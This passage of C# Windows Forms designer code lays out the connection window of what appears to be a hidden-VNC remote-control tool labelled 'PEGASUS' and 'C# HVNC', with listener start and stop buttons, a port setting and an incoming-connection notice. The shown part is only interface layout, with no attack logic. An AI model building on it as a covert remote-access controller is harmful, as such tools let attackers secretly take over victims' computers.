		buttonspanel.Controls.Add(btnStartL);
		guna2Transition1.SetDecoration(buttonspanel, Guna.UI2.AnimatorNS.DecorationType.None);
		buttonspanel.Font = new System.Drawing.Font("Electrolize", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		buttonspanel.Location = new System.Drawing.Point(134, 20);
		buttonspanel.Name = "buttonspanel";
		buttonspanel.ShadowDecoration.Color = System.Drawing.Color.FromArgb(191, 37, 33);
		buttonspanel.ShadowDecoration.Enabled = true;
		buttonspanel.ShadowDecoration.Parent = buttonspanel;
		buttonspanel.Size = new System.Drawing.Size(147, 86);
		buttonspanel.TabIndex = 19;
		buttonspanel.Visible = false;
		buttonspanel.MouseLeave += new System.EventHandler(buttonspanel_MouseLeave);
		numPort.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		numPort.BackColor = System.Drawing.Color.Transparent;
		numPort.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		numPort.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition1.SetDecoration(numPort, Guna.UI2.AnimatorNS.DecorationType.None);
		numPort.DisabledState.Parent = numPort;
		numPort.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		numPort.FocusedState.Parent = numPort;
		numPort.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		numPort.ForeColor = System.Drawing.Color.LightGray;
		numPort.Location = new System.Drawing.Point(0, 55);
		numPort.Maximum = new decimal(new int[4] { 999999, 0, 0, 0 });
		numPort.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		numPort.Name = "numPort";
		numPort.ShadowDecoration.Parent = numPort;
		numPort.Size = new System.Drawing.Size(148, 25);
		numPort.TabIndex = 142;
		numPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
		numPort.UpDownButtonForeColor = System.Drawing.Color.White;
		numPort.Value = new decimal(new int[4] { 4448, 0, 0, 0 });
		btnStopL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		btnStopL.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnStopL.BorderThickness = 1;
		btnStopL.CheckedState.Parent = btnStopL;
		btnStopL.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnStopL.CustomImages.Parent = btnStopL;
		guna2Transition1.SetDecoration(btnStopL, Guna.UI2.AnimatorNS.DecorationType.None);
		btnStopL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnStopL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnStopL.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStopL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStopL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnStopL.DisabledState.Parent = btnStopL;
		btnStopL.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStopL.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnStopL.Font = new System.Drawing.Font("Electrolize", 9f);
		btnStopL.ForeColor = System.Drawing.Color.White;
		btnStopL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnStopL.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnStopL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnStopL.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStopL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnStopL.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnStopL.HoverState.Parent = btnStopL;
		btnStopL.Location = new System.Drawing.Point(0, 30);
		btnStopL.Name = "btnStopL";
		btnStopL.ShadowDecoration.Parent = btnStopL;
		btnStopL.Size = new System.Drawing.Size(147, 25);
		btnStopL.TabIndex = 141;
		btnStopL.Text = "Stop Listening";
		btnStopL.Click += new System.EventHandler(btnStopL_Click);
		btnStartL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		btnStartL.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnStartL.BorderThickness = 1;
		btnStartL.CheckedState.Parent = btnStartL;
		btnStartL.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnStartL.CustomImages.Parent = btnStartL;
		guna2Transition1.SetDecoration(btnStartL, Guna.UI2.AnimatorNS.DecorationType.None);
		btnStartL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnStartL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnStartL.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStartL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStartL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnStartL.DisabledState.Parent = btnStartL;
		btnStartL.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStartL.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnStartL.Font = new System.Drawing.Font("Electrolize", 9f);
		btnStartL.ForeColor = System.Drawing.Color.White;
		btnStartL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnStartL.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnStartL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnStartL.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStartL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnStartL.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnStartL.HoverState.Parent = btnStartL;
		btnStartL.Location = new System.Drawing.Point(0, 5);
		btnStartL.Name = "btnStartL";
		btnStartL.ShadowDecoration.Parent = btnStartL;
		btnStartL.Size = new System.Drawing.Size(147, 25);
		btnStartL.TabIndex = 140;
		btnStartL.Text = "Start Listener";
		btnStartL.Click += new System.EventHandler(btnStartL_Click);
		listView2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		listView2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { colDateTime, colEven });
		guna2Transition1.SetDecoration(listView2, Guna.UI2.AnimatorNS.DecorationType.None);
		listView2.ForeColor = System.Drawing.Color.LightCyan;
		listView2.HideSelection = false;
		listView2.Location = new System.Drawing.Point(2, 491);
		listView2.Name = "listView2";
		listView2.OwnerDraw = true;
		listView2.Size = new System.Drawing.Size(1243, 126);
		listView2.TabIndex = 20;
		listView2.UseCompatibleStateImageBehavior = false;
		listView2.View = System.Windows.Forms.View.Details;
		listView2.Visible = false;
		colDateTime.Text = "Date/Time";
		colDateTime.Width = 109;
		colEven.Text = "Event";
		colEven.Width = 143;
		notifyIcon.BalloonTipTitle = "PEGASUS | Client";
		notifyIcon.Icon = (System.Drawing.Icon)resources.GetObject("notifyIcon.Icon");
		notifyIcon.Text = " Incoming Connection";
		notifyIcon.Visible = true;
		imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
		imageList1.TransparentColor = System.Drawing.Color.Transparent;
		imageList1.Images.SetKeyName(0, "user_16px.png");
		timer1.Enabled = true;
		timer1.Interval = 1000;
		imageList2.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList2.ImageStream");
		imageList2.TransparentColor = System.Drawing.Color.Transparent;
		imageList2.Images.SetKeyName(0, "user_16px.png");
		guna2Transition1.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
		guna2Transition1.Cursor = null;
		animation.AnimateOnlyDifferences = true;
		animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation2.BlindCoeff");
		animation.LeafCoeff = 0f;
		animation.MaxTime = 1f;
		animation.MinTime = 0f;
		animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation2.MosaicCoeff");
		animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation2.MosaicShift");
		animation.MosaicSize = 1;
		animation.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
		animation.RotateCoeff = 0f;
		animation.RotateLimit = 0f;
		animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation2.ScaleCoeff");
		animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation2.SlideCoeff");
		animation.TimeCoeff = 2f;
		animation.TransparencyCoeff = 0f;
		guna2Transition1.DefaultAnimation = animation;
		lblOnline.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(lblOnline, Guna.UI2.AnimatorNS.DecorationType.None);
		lblOnline.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		lblOnline.ForeColor = System.Drawing.Color.WhiteSmoke;
		lblOnline.Location = new System.Drawing.Point(7, 88);
		lblOnline.Name = "lblOnline";
		lblOnline.Size = new System.Drawing.Size(121, 18);
		lblOnline.TabIndex = 23;
		lblOnline.Text = "No User Connected";
		lblDownload.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		lblDownload.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(lblDownload, Guna.UI2.AnimatorNS.DecorationType.None);
		lblDownload.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		lblDownload.ForeColor = System.Drawing.Color.White;
		lblDownload.Location = new System.Drawing.Point(1075, 88);
		lblDownload.Name = "lblDownload";
		lblDownload.Size = new System.Drawing.Size(108, 18);
		lblDownload.TabIndex = 22;
		lblDownload.Text = "Download Speed";
		lblUpload.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		lblUpload.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(lblUpload, Guna.UI2.AnimatorNS.DecorationType.None);
		lblUpload.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		lblUpload.ForeColor = System.Drawing.Color.White;
		lblUpload.Location = new System.Drawing.Point(918, 88);
		lblUpload.Name = "lblUpload";
		lblUpload.Size = new System.Drawing.Size(92, 18);
		lblUpload.TabIndex = 21;
		lblUpload.Text = "Upload Speed";
		chkSubitemIcons.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		chkSubitemIcons.CheckedFillColor = System.Drawing.Color.FromArgb(191, 38, 33);
		chkSubitemIcons.CheckedInnerColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Transition1.SetDecoration(chkSubitemIcons, Guna.UI2.AnimatorNS.DecorationType.None);
		chkSubitemIcons.ForeColor = System.Drawing.Color.FromArgb(191, 38, 33);
		chkSubitemIcons.Location = new System.Drawing.Point(1022, 24);
		chkSubitemIcons.Name = "chkSubitemIcons";
		chkSubitemIcons.Size = new System.Drawing.Size(38, 14);
		chkSubitemIcons.TabIndex = 62;
		chkSubitemIcons.Text = "siticoneOSToggleSwith2";
		chkSubitemIcons.UncheckedFillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkSubitemIcons.UncheckInnerColor = System.Drawing.Color.FromArgb(191, 38, 33);
		siticoneLabel1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		siticoneLabel1.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(siticoneLabel1, Guna.UI2.AnimatorNS.DecorationType.None);
		siticoneLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		siticoneLabel1.ForeColor = System.Drawing.Color.White;
		siticoneLabel1.Location = new System.Drawing.Point(949, 22);
		siticoneLabel1.Name = "siticoneLabel1";
		siticoneLabel1.Size = new System.Drawing.Size(61, 18);
		siticoneLabel1.TabIndex = 61;
		siticoneLabel1.Text = "List Icons:";
		label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
		label1.AutoSize = true;
		guna2Transition1.SetDecoration(label1, Guna.UI2.AnimatorNS.DecorationType.None);
		label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		label1.ForeColor = System.Drawing.Color.LightGray;
		label1.Location = new System.Drawing.Point(588, 22);
		label1.Name = "label1";
		label1.Size = new System.Drawing.Size(86, 19);
		label1.TabIndex = 63;
		label1.Text = "C# HVNC";
		guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(1246, 617);
		base.Controls.Add(label1);
		base.Controls.Add(chkSubitemIcons);
		base.Controls.Add(siticoneLabel1);
		base.Controls.Add(lblOnline);
		base.Controls.Add(lblDownload);
		base.Controls.Add(lblUpload);
		base.Controls.Add(buttonspanel);
		base.Controls.Add(guna2Button1);
		base.Controls.Add(guna2PictureBox1);
		base.Controls.Add(listView1);
		base.Controls.Add(guna2ControlBox3);
		base.Controls.Add(guna2ControlBox2);
		base.Controls.Add(guna2ControlBox1);
		base.Controls.Add(listView2);
		guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
		Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "RhVNC_Connections";
		Text = "hVNC_Connections";
		base.Load += new System.EventHandler(RhVNC_Connections_Load);
		guna2ContextMenuStrip2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
		buttonspanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)numPort).EndInit();
		ResumeLayout(false);
		PerformLayout();
	}
}
}